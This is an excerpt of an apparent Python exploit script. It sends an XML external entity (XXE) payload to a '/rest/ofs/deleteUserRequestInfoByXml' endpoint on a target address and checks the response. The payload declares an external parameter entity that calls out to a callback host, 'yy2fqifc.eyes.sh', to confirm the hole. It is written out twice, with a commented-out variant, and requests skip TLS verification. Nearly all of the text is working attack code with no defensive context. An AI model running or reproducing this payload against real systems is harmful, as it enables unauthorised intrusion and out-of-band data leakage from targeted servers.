...
def exploit(ip_, index):
    try:
        ...
        url = ip_+'/rest/ofs/deleteUserRequestInfoByXml'
        # print(index,url)
        headers.update({"Content-Type": "application/xml"})
        # print(headers)
        payload1=b"""<?xml version="1.0"?>
<!DOCTYPE ANY [
    <!ENTITY % d SYSTEM "http://yy2fqifc.eyes.sh">
    %d;
]>
<a>&xxe;</a>"""
        payload="<?xml version=\"1.0\"?>\r\n<!DOCTYPE ANY [\r\n    <!ENTITY % d SYSTEM \"http://yy2fqifc.eyes.sh\">\r\n    %d;\r\n]>\r\n<a>&xxe;</a>"
        # payload='<?xml version=\"1.0\"?> \r\n<!DOCTYPE foo [    \r\n<!ENTITY xxe "mikejordan" > ]> \r\n<foo>&xxe;</foo>'
        res = requests.post(url,data=payload, headers=headers, timeout=8, verify=False)
        if res.status_code!=200 or 'ResultInfo' not in res.text:
            return
